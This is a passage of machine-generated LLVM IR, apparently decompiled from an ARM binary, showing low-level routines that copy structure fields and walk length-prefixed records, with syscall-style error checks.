dec_label_pc_13c94:                               ; preds = %dec_label_pc_13c68, %dec_label_pc_13c84
  %v1_13c98 = phi i32 [ %v0_13c74, %dec_label_pc_13c68 ], [ -1, %dec_label_pc_13c84 ]
  %v2_13c94 = phi i32 [ %v3_13c68, %dec_label_pc_13c68 ], [ %v2_13c94.pre, %dec_label_pc_13c84 ]
  store i32 %v2_13c94, i32* %r7.global-to-local, align 4
  ret i32 %v1_13c98

; uselistorder directives
  uselistorder i32 %v0_13c74, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13c94, { 1, 0 }
}

define i32 @function_13c9c() local_unnamed_addr {
dec_label_pc_13c9c:
  %v1_13cac = load i32, i32* @r0, align 4
  ret i32 %v1_13cac
}

define i32 @function_13cb0() local_unnamed_addr {
dec_label_pc_13cb0:
  %v1_13cc0 = load i32, i32* @r0, align 4
  ret i32 %v1_13cc0
}

define i32 @function_13cc4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13cc4:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_13cc4 = load i32, i32* @r5, align 4
  %v18_13cc4 = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13cf4, label %dec_label_pc_13ce0

dec_label_pc_13ce0:                               ; preds = %dec_label_pc_13cc4
  %v0_13ce0 = call i32 @function_11204()
  %v0_13ce4 = load i32, i32* @r5, align 4
  %v1_13ce4 = sub i32 0, %v0_13ce4
  store i32 %v1_13ce4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  %v2_13cec = inttoptr i32 %v0_13ce0 to i32*
  store i32 %v1_13ce4, i32* %v2_13cec, align 4
  br label %dec_label_pc_13d48

dec_label_pc_13cf4:                               ; preds = %dec_label_pc_13cc4
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13cf4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_13cfc = add i32 %arg2, %arg1
  store i32 %v3_13cfc, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13cf4, %bb
  %v1_13d384 = phi i32 [ %v18_13cc4, %dec_label_pc_13cf4 ], [ %v3_13cfc, %bb ]
  %v0_13d342 = phi i32 [ 141, %dec_label_pc_13cf4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_13d48, label %dec_label_pc_13d34

dec_label_pc_13d08:                               ; preds = %dec_label_pc_13d34
  %v1_13d08 = add i32 %v0_13d08, 8
  %v2_13d08 = inttoptr i32 %v1_13d08 to i16*
  %v3_13d08 = load i16, i16* %v2_13d08, align 2
  %v4_13d08 = zext i16 %v3_13d08 to i32
  %v2_13d0c = add i32 %v4_13d08, %v0_13d08
  store i32 %v2_13d0c, i32* %r3.global-to-local, align 4
  %v1_13d10 = add i32 %v2_13d0c, -1
  %v2_13d10 = inttoptr i32 %v1_13d10 to i8*
  %v3_13d10 = load i8, i8* %v2_13d10, align 1
  %v4_13d10 = zext i8 %v3_13d10 to i32
  store i32 %v4_13d10, i32* @r4, align 4
  %v1_13d14 = call i32 @function_15840(i32 %v1_13d34)
  %v0_13d18 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13d18, i32* @r1, align 4
  %v1_13d1c = add i32 %v1_13d14, 1
  store i32 %v1_13d1c, i32* @r2, align 4
  %v0_13d20 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13d20, i32* @r0, align 4
  %v3_13d24 = call i32 @function_11300(i32 %v0_13d20, i32 %v0_13d18, i32 %v1_13d1c)
  %v0_13d28 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d28 = add i32 %v0_13d28, 8
  %v2_13d28 = inttoptr i32 %v1_13d28 to i16*
  %v3_13d28 = load i16, i16* %v2_13d28, align 2
  %v4_13d28 = zext i16 %v3_13d28 to i32
  store i32 %v4_13d28, i32* %r3.global-to-local, align 4
  %v0_13d2c = load i32, i32* @r4, align 4
  %v1_13d2c = trunc i32 %v0_13d2c to i8
  %v3_13d2c = add i32 %v0_13d28, 10
  %v4_13d2c = inttoptr i32 %v3_13d2c to i8*
  store i8 %v1_13d2c, i8* %v4_13d2c, align 1
  %v0_13d30 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d30 = load i32, i32* %r3.global-to-local, align 4
  %v2_13d30 = add i32 %v1_13d30, %v0_13d30
  store i32 %v2_13d30, i32* %r7.global-to-local, align 4
  %v1_13d38.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13d34

dec_label_pc_13d34:                               ; preds = %.thread, %dec_label_pc_13d08
  %v1_13d38 = phi i32 [ %v1_13d38.pre, %dec_label_pc_13d08 ], [ %v1_13d384, %.thread ]
  %v0_13d08 = phi i32 [ %v2_13d30, %dec_label_pc_13d08 ], [ %v0_13d342, %.thread ]
  %v1_13d34 = add i32 %v0_13d08, 10
  store i32 %v1_13d34, i32* %r6.global-to-local, align 4
  %v3_13d38 = icmp ult i32 %v0_13d08, %v1_13d38
  %v1_13d40 = add i32 %v0_13d08, 11
  store i32 %v1_13d40, i32* %r8.global-to-local, align 4
  br i1 %v3_13d38, label %dec_label_pc_13d08, label %dec_label_pc_13d48

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d34, %.thread, %dec_label_pc_13ce0
  %v0_13d48 = load i32, i32* @r5, align 4
  store i32 %v6_13cc4, i32* @r5, align 4
  store i32 %v18_13cc4, i32* @sl, align 4
  ret i32 %v0_13d48

; uselistorder directives
  uselistorder i32 %v1_13d34, { 1, 0 }
  uselistorder i32 %v0_13d08, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_13cc4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13d34, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13d58() local_unnamed_addr {
dec_label_pc_13d58:
  %r7.global-to-local = alloca i32, align 4
  %v0_13d60 = load i32, i32* @r1, align 4
  store i32 %v0_13d60, i32* @r3, align 4
  %v0_13d70 = load i32, i32* @r0, align 4
  store i32 %v0_13d70, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13d70, -4095
  br i1 %tmp, label %dec_label_pc_13d90, label %dec_label_pc_13d7c

dec_label_pc_13d7c:                               ; preds = %dec_label_pc_13d58
  %v0_13d7c = call i32 @function_11204()
  %v0_13d80 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d80 = sub i32 0, %v0_13d80
  store i32 %v1_13d80, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_13d88 = inttoptr i32 %v0_13d7c to i32*
  store i32 %v1_13d80, i32* %v2_13d88, align 4
  br label %dec_label_pc_13da0

dec_label_pc_13d90:                               ; preds = %dec_label_pc_13d58
  %v2_13d90 = icmp eq i32 %v0_13d70, 0
  br i1 %v2_13d90, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13d90
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13d90, %bb
  call void @__pseudo_cond_branch(i1 %v2_13d90, i32 ptrtoint (i32* @global_var_13fa8.490 to i32))
  br label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d7c, %.thread
  %v0_13da0 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_13da0

; uselistorder directives
  uselistorder i32 %v0_13d70, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13da0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13db0(i32 %arg1) local_unnamed_addr {
dec_label_pc_13db0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13db0 = load i32, i32* @r4, align 4
  store i32 %v3_13db0, i32* %stack_var_-16, align 4
  store i32 124820, i32* %r4.global-to-local, align 4
  %v4_13dc0 = load i32, i32* @global_var_20a58.493, align 4
  %v2_13dc4 = icmp eq i32 %v4_13dc0, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13dc4, label %dec_label_pc_13dd0, label %dec_label_pc_13de0

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13db0
  %v1_13dd4 = call i32 @function_15d4c(i32 0)
  %v1_13dd8 = icmp slt i32 %v1_13dd4, 0
  br i1 %v1_13dd8, label %dec_label_pc_13e04, label %dec_label_pc_13de0thread-pre-split

dec_label_pc_13de0thread-pre-split:               ; preds = %dec_label_pc_13dd0
  %v0_13de4.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_13de0.pre = load i32, i32* @global_var_20a58.493, align 4
  br label %dec_label_pc_13de0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13de0thread-pre-split, %dec_label_pc_13db0
  %v0_13df0 = phi i32 [ %v4_13de0.pre, %dec_label_pc_13de0thread-pre-split ], [ %v4_13dc0, %dec_label_pc_13db0 ]
  %v1_13df4 = phi i32 [ %v0_13de4.pr, %dec_label_pc_13de0thread-pre-split ], [ %arg1, %dec_label_pc_13db0 ]
  %v2_13de4 = icmp eq i32 %v1_13df4, 0
  store i32 %v0_13df0, i32* %r4.global-to-local, align 4
  br i1 %v2_13de4, label %dec_label_pc_13e08, label %dec_label_pc_13df0

dec_label_pc_13df0:                               ; preds = %dec_label_pc_13de0
  %v2_13df4 = add i32 %v1_13df4, %v0_13df0
  %v1_13df8 = call i32 @function_15d4c(i32 %v2_13df4)
  %v1_13dfc = icmp slt i32 %v1_13df8, 0
  br i1 %v1_13dfc, label %dec_label_pc_13e04, label %dec_label_pc_13df0.dec_label_pc_13e08_crit_edge

dec_label_pc_13df0.dec_label_pc_13e08_crit_edge:  ; preds = %dec_label_pc_13df0
  %v0_13e08.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e08

dec_label_pc_13e04:                               ; preds = %dec_label_pc_13df0, %dec_label_pc_13dd0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e08

dec_label_pc_13e08:                               ; preds = %dec_label_pc_13de0, %dec_label_pc_13df0.dec_label_pc_13e08_crit_edge, %dec_label_pc_13e04
  %v0_13e08 = phi i32 [ %v0_13e08.pre, %dec_label_pc_13df0.dec_label_pc_13e08_crit_edge ], [ -1, %dec_label_pc_13e04 ], [ %v0_13df0, %dec_label_pc_13de0 ]
  %v2_13e0c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13e0c, i32* @r4, align 4
  ret i32 %v0_13e08

; uselistorder directives
  uselistorder i32 %v0_13df0, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_15d4c, { 1, 0 }
  uselistorder label %dec_label_pc_13e08, { 2, 1, 0 }
}

define i32 @function_13e1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13e1c:
  %v1_13e2c = load i32, i32* @r0, align 4
  ret i32 %v1_13e2c
}

define i32 @function_13e30(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13e30:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13e30 = load i32, i32* @r4, align 4
  store i32 %v3_13e30, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_13e48 = inttoptr i32 %arg2 to i8*
  %v3_13e48 = call i32 @function_11260(i8* %v2_13e48, i32 0)
  %v2_13e4c = load i32, i32* %arg1, align 4
  store i32 %v2_13e4c, i32* %r3.global-to-local, align 4
  %v3_13e4c = add i32 %tmp, 4
  %v4_13e4c = inttoptr i32 %v3_13e4c to i32*
  %v5_13e4c = load i32, i32* %v4_13e4c, align 4
  store i32 %v5_13e4c, i32* %r4.global-to-local, align 4
  %v0_13e50 = load i32, i32* %r5.global-to-local, align 4
  %v1_13e50 = inttoptr i32 %v0_13e50 to i32*
  store i32 %v2_13e4c, i32* %v1_13e50, align 4
  %v3_13e50 = add i32 %v0_13e50, 4
  %v4_13e50 = inttoptr i32 %v3_13e50 to i32*
  %v5_13e50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13e50, i32* %v4_13e50, align 4
  %v0_13e54 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e54 = add i32 %v0_13e54, 12
  %v2_13e54 = inttoptr i32 %v1_13e54 to i32*
  %v3_13e54 = load i32, i32* %v2_13e54, align 4
  %v1_13e58 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e58 = add i32 %v1_13e58, 12
  %v3_13e58 = inttoptr i32 %v2_13e58 to i32*
  store i32 %v3_13e54, i32* %v3_13e58, align 4
  %v0_13e5c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e5c = add i32 %v0_13e5c, 96
  store i32 %v1_13e5c, i32* %r3.global-to-local, align 4
  %v1_13e60 = inttoptr i32 %v1_13e5c to i32*
  %v2_13e60 = load i32, i32* %v1_13e60, align 4
  store i32 %v2_13e60, i32* %r3.global-to-local, align 4
  %v3_13e60 = add i32 %v0_13e5c, 100
  %v4_13e60 = inttoptr i32 %v3_13e60 to i32*
  %v5_13e60 = load i32, i32* %v4_13e60, align 4
  store i32 %v5_13e60, i32* %r4.global-to-local, align 4
  %v1_13e64 = add i32 %v0_13e5c, 56
  %v2_13e64 = inttoptr i32 %v1_13e64 to i32*
  %v3_13e64 = load i32, i32* %v2_13e64, align 4
  store i32 %v3_13e64, i32* %r2.global-to-local, align 4
  %v1_13e68 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e68 = add i32 %v1_13e68, 96
  %v3_13e68 = inttoptr i32 %v2_13e68 to i32*
  store i32 %v2_13e60, i32* %v3_13e68, align 4
  %v0_13e6c = load i32, i32* %r4.global-to-local, align 4
  %v1_13e6c = load i32, i32* %r5.global-to-local, align 4
  %v2_13e6c = add i32 %v1_13e6c, 100
  %v3_13e6c = inttoptr i32 %v2_13e6c to i32*
  store i32 %v0_13e6c, i32* %v3_13e6c, align 4
  %v0_13e70 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e70 = add i32 %v0_13e70, 24
  store i32 %v1_13e70, i32* %ip.global-to-local, align 4
  %v1_13e74 = inttoptr i32 %v1_13e70 to i32*
  %v2_13e74 = load i32, i32* %v1_13e74, align 4
  store i32 %v2_13e74, i32* %ip.global-to-local, align 4
  %v3_13e74 = add i32 %v0_13e70, 28
  %v4_13e74 = inttoptr i32 %v3_13e74 to i32*
  %v5_13e74 = load i32, i32* %v4_13e74, align 4
  store i32 %v5_13e74, i32* %lr.global-to-local, align 4
  %v0_13e78 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e78 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e78 = add i32 %v1_13e78, 56
  %v3_13e78 = inttoptr i32 %v2_13e78 to i32*
  store i32 %v0_13e78, i32* %v3_13e78, align 4
  %v0_13e7c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e7c = add i32 %v0_13e7c, 72
  store i32 %v1_13e7c, i32* %r3.global-to-local, align 4
  %v1_13e80 = add i32 %v0_13e7c, 32
  store i32 %v1_13e80, i32* %r7.global-to-local, align 4
  %v1_13e84 = inttoptr i32 %v1_13e80 to i32*
  %v2_13e84 = load i32, i32* %v1_13e84, align 4
  store i32 %v2_13e84, i32* %r7.global-to-local, align 4
  %v3_13e84 = add i32 %v0_13e7c, 36
  %v4_13e84 = inttoptr i32 %v3_13e84 to i32*
  %v5_13e84 = load i32, i32* %v4_13e84, align 4
  store i32 %v5_13e84, i32* %r8.global-to-local, align 4
  %v1_13e88 = inttoptr i32 %v1_13e7c to i32*
  %v2_13e88 = load i32, i32* %v1_13e88, align 4
  %v3_13e88 = add i32 %v0_13e7c, 76
  %v4_13e88 = inttoptr i32 %v3_13e88 to i32*
  %v5_13e88 = load i32, i32* %v4_13e88, align 4
  store i32 %v5_13e88, i32* %r1.global-to-local, align 4
  %v0_13e8c = load i32, i32* %r5.global-to-local, align 4
  %v1_13e8c = add i32 %v0_13e8c, 72
  %v1_13e90 = inttoptr i32 %v1_13e8c to i32*
  store i32 %v2_13e88, i32* %v1_13e90, align 4
  %v3_13e90 = add i32 %v0_13e8c, 76
  %v4_13e90 = inttoptr i32 %v3_13e90 to i32*
  %v5_13e90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13e90, i32* %v4_13e90, align 4
  %v0_13e94 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e94 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e94 = add i32 %v1_13e94, 32
  %v3_13e94 = inttoptr i32 %v2_13e94 to i32*
  store i32 %v0_13e94, i32* %v3_13e94, align 4
  %v0_13e98 = load i32, i32* %r8.global-to-local, align 4
  %v1_13e98 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e98 = add i32 %v1_13e98, 36
  %v3_13e98 = inttoptr i32 %v2_13e98 to i32*
  store i32 %v0_13e98, i32* %v3_13e98, align 4
  %v0_13e9c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e9c = add i32 %v0_13e9c, 80
  store i32 %v1_13e9c, i32* %r3.global-to-local, align 4
  %v1_13ea0 = add i32 %v0_13e9c, 48
  store i32 %v1_13ea0, i32* %r7.global-to-local, align 4
  %v1_13ea4 = inttoptr i32 %v1_13ea0 to i32*
  %v2_13ea4 = load i32, i32* %v1_13ea4, align 4
  store i32 %v2_13ea4, i32* %r7.global-to-local, align 4
  %v3_13ea4 = add i32 %v0_13e9c, 52
  %v4_13ea4 = inttoptr i32 %v3_13ea4 to i32*
  %v5_13ea4 = load i32, i32* %v4_13ea4, align 4
  store i32 %v5_13ea4, i32* %r8.global-to-local, align 4
  %v1_13ea8 = inttoptr i32 %v1_13e9c to i32*
  %v2_13ea8 = load i32, i32* %v1_13ea8, align 4
  %v3_13ea8 = add i32 %v0_13e9c, 84
  %v4_13ea8 = inttoptr i32 %v3_13ea8 to i32*
  %v5_13ea8 = load i32, i32* %v4_13ea8, align 4
  store i32 %v5_13ea8, i32* %r1.global-to-local, align 4
  %v1_13eac = add i32 %v0_13e9c, 16
  %v2_13eac = inttoptr i32 %v1_13eac to i32*
  %v3_13eac = load i32, i32* %v2_13eac, align 4
  store i32 %v3_13eac, i32* %r2.global-to-local, align 4
  %v0_13eb0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13eb0 = add i32 %v0_13eb0, 80
  %v1_13eb4 = inttoptr i32 %v1_13eb0 to i32*
  store i32 %v2_13ea8, i32* %v1_13eb4, align 4
  %v3_13eb4 = add i32 %v0_13eb0, 84
  %v4_13eb4 = inttoptr i32 %v3_13eb4 to i32*
  %v5_13eb4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13eb4, i32* %v4_13eb4, align 4
  %v0_13eb8 = load i32, i32* %r7.global-to-local, align 4
  %v1_13eb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13eb8 = add i32 %v1_13eb8, 48
  %v3_13eb8 = inttoptr i32 %v2_13eb8 to i32*
  store i32 %v0_13eb8, i32* %v3_13eb8, align 4
  %v0_13ebc = load i32, i32* %r8.global-to-local, align 4
  %v1_13ebc = load i32, i32* %r5.global-to-local, align 4
  %v2_13ebc = add i32 %v1_13ebc, 52
  %v3_13ebc = inttoptr i32 %v2_13ebc to i32*
  store i32 %v0_13ebc, i32* %v3_13ebc, align 4
  %v0_13ec0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ec0 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ec0 = add i32 %v1_13ec0, 16
  %v3_13ec0 = inttoptr i32 %v2_13ec0 to i32*
  store i32 %v0_13ec0, i32* %v3_13ec0, align 4
  %v0_13ec4 = load i32, i32* %r6.global-to-local, align 4
  %v1_13ec4 = add i32 %v0_13ec4, 88
  store i32 %v1_13ec4, i32* %r3.global-to-local, align 4
  %v1_13ec8 = add i32 %v0_13ec4, 20
  %v2_13ec8 = inttoptr i32 %v1_13ec8 to i32*
  %v3_13ec8 = load i32, i32* %v2_13ec8, align 4
  store i32 %v3_13ec8, i32* %r2.global-to-local, align 4
  %v1_13ecc = inttoptr i32 %v1_13ec4 to i32*
  %v2_13ecc = load i32, i32* %v1_13ecc, align 4
  %v3_13ecc = add i32 %v0_13ec4, 92
  %v4_13ecc = inttoptr i32 %v3_13ecc to i32*
  %v5_13ecc = load i32, i32* %v4_13ecc, align 4
  store i32 %v5_13ecc, i32* %r1.global-to-local, align 4
  %v1_13ed0 = add i32 %v0_13ec4, 64
  store i32 %v1_13ed0, i32* %r6.global-to-local, align 4
  %v1_13ed4 = inttoptr i32 %v1_13ed0 to i32*
  %v2_13ed4 = load i32, i32* %v1_13ed4, align 4
  store i32 %v2_13ed4, i32* %r6.global-to-local, align 4
  %v3_13ed4 = add i32 %v0_13ec4, 68
  %v4_13ed4 = inttoptr i32 %v3_13ed4 to i32*
  %v5_13ed4 = load i32, i32* %v4_13ed4, align 4
  store i32 %v5_13ed4, i32* %r7.global-to-local, align 4
  %v0_13ed8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ed8 = add i32 %v0_13ed8, 88
  store i32 %v1_13ed8, i32* %r3.global-to-local, align 4
  %v2_13edc = add i32 %v0_13ed8, 20
  %v3_13edc = inttoptr i32 %v2_13edc to i32*
  store i32 %v3_13ec8, i32* %v3_13edc, align 4
  %v0_13ee0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ee0 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ee0 = add i32 %v1_13ee0, 24
  %v3_13ee0 = inttoptr i32 %v2_13ee0 to i32*
  store i32 %v0_13ee0, i32* %v3_13ee0, align 4
  %v0_13ee4 = load i32, i32* %lr.global-to-local, align 4
  %v1_13ee4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ee4 = add i32 %v1_13ee4, 28
  %v3_13ee4 = inttoptr i32 %v2_13ee4 to i32*
  store i32 %v0_13ee4, i32* %v3_13ee4, align 4
  %v0_13ee8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13ee8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ee8 = add i32 %v1_13ee8, 64
  %v3_13ee8 = inttoptr i32 %v2_13ee8 to i32*
  store i32 %v0_13ee8, i32* %v3_13ee8, align 4
  %v0_13eec = load i32, i32* %r7.global-to-local, align 4
  %v1_13eec = load i32, i32* %r5.global-to-local, align 4
  %v2_13eec = add i32 %v1_13eec, 68
  %v3_13eec = inttoptr i32 %v2_13eec to i32*
  store i32 %v0_13eec, i32* %v3_13eec, align 4
  %v0_13ef0 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ef0 = inttoptr i32 %v0_13ef0 to i32*
  store i32 %v2_13ecc, i32* %v1_13ef0, align 4
  %v3_13ef0 = add i32 %v0_13ef0, 4
  %v4_13ef0 = inttoptr i32 %v3_13ef0 to i32*
  %v5_13ef0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13ef0, i32* %v4_13ef0, align 4
  %v2_13ef4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13ef4, i32* %r4.global-to-local, align 4
  ret i32 %v2_13ecc

; uselistorder directives
  uselistorder i32 %v0_13ec4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_13e9c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 1, 0, 2 }
  uselistorder i32 104, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_13efc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13efc:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13efc = load i32, i32* @r4, align 4
  store i32 %v3_13efc, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_13f14 = inttoptr i32 %arg2 to i8*
  %v3_13f14 = call i32 @function_11260(i8* %v2_13f14, i32 0)
  %v2_13f18 = load i32, i32* %arg1, align 4
  %v3_13f18 = add i32 %tmp, 4
  %v4_13f18 = inttoptr i32 %v3_13f18 to i32*
  %v5_13f18 = load i32, i32* %v4_13f18, align 4
  store i32 %v5_13f18, i32* %r4.global-to-local, align 4
  %v0_13f1c = load i32, i32* %r6.global-to-local, align 4
  %v1_13f1c = inttoptr i32 %v0_13f1c to i32*
  store i32 %v2_13f18, i32* %v1_13f1c, align 4
  %v3_13f1c = add i32 %v0_13f1c, 4
  %v4_13f1c = inttoptr i32 %v3_13f1c to i32*
  %v5_13f1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13f1c, i32* %v4_13f1c, align 4
  %v0_13f20 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f20 = add i32 %v0_13f20, 32
  %v1_13f24 = inttoptr i32 %v1_13f20 to i32*
  %v2_13f24 = load i32, i32* %v1_13f24, align 4
  %v3_13f24 = add i32 %v0_13f20, 36
  %v4_13f24 = inttoptr i32 %v3_13f24 to i32*
  %v5_13f24 = load i32, i32* %v4_13f24, align 4
  store i32 %v5_13f24, i32* %r4.global-to-local, align 4
  %v1_13f28 = add i32 %v0_13f20, 96
  %v2_13f28 = inttoptr i32 %v1_13f28 to i32*
  %v3_13f28 = load i32, i32* %v2_13f28, align 4
  store i32 %v3_13f28, i32* %r2.global-to-local, align 4
  %v1_13f2c = load i32, i32* %r6.global-to-local, align 4
  %v2_13f2c = add i32 %v1_13f2c, 32
  %v3_13f2c = inttoptr i32 %v2_13f2c to i32*
  store i32 %v2_13f24, i32* %v3_13f2c, align 4
  %v0_13f30 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f30 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f30 = add i32 %v1_13f30, 36
  %v3_13f30 = inttoptr i32 %v2_13f30 to i32*
  store i32 %v0_13f30, i32* %v3_13f30, align 4
  %v0_13f34 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f34 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f34 = add i32 %v1_13f34, 12
  %v3_13f34 = inttoptr i32 %v2_13f34 to i32*
  store i32 %v0_13f34, i32* %v3_13f34, align 4
  %v0_13f38 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f38 = add i32 %v0_13f38, 48
  %v2_13f38 = inttoptr i32 %v1_13f38 to i32*
  %v3_13f38 = load i32, i32* %v2_13f38, align 4
  %v1_13f3c = add i32 %v0_13f38, 24
  store i32 %v1_13f3c, i32* %ip.global-to-local, align 4
  %v1_13f40 = inttoptr i32 %v1_13f3c to i32*
  %v2_13f40 = load i32, i32* %v1_13f40, align 4
  store i32 %v2_13f40, i32* %ip.global-to-local, align 4
  %v3_13f40 = add i32 %v0_13f38, 28
  %v4_13f40 = inttoptr i32 %v3_13f40 to i32*
  %v5_13f40 = load i32, i32* %v4_13f40, align 4
  store i32 %v5_13f40, i32* %lr.global-to-local, align 4
  %v1_13f44 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f44 = add i32 %v1_13f44, 44
  %v3_13f44 = inttoptr i32 %v2_13f44 to i32*
  store i32 %v3_13f38, i32* %v3_13f44, align 4
  %v0_13f48 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f48 = add i32 %v0_13f48, 64
  %v2_13f48 = inttoptr i32 %v1_13f48 to i32*
  %v3_13f48 = load i32, i32* %v2_13f48, align 4
  %v1_13f4c = add i32 %v0_13f48, 56
  %v2_13f4c = inttoptr i32 %v1_13f4c to i32*
  %v3_13f4c = load i32, i32* %v2_13f4c, align 4
  store i32 %v3_13f4c, i32* %r2.global-to-local, align 4
  %v1_13f50 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f50 = add i32 %v1_13f50, 52
  %v3_13f50 = inttoptr i32 %v2_13f50 to i32*
  store i32 %v3_13f48, i32* %v3_13f50, align 4
  %v0_13f54 = load i32, i32* %r2.global-to-local, align 4
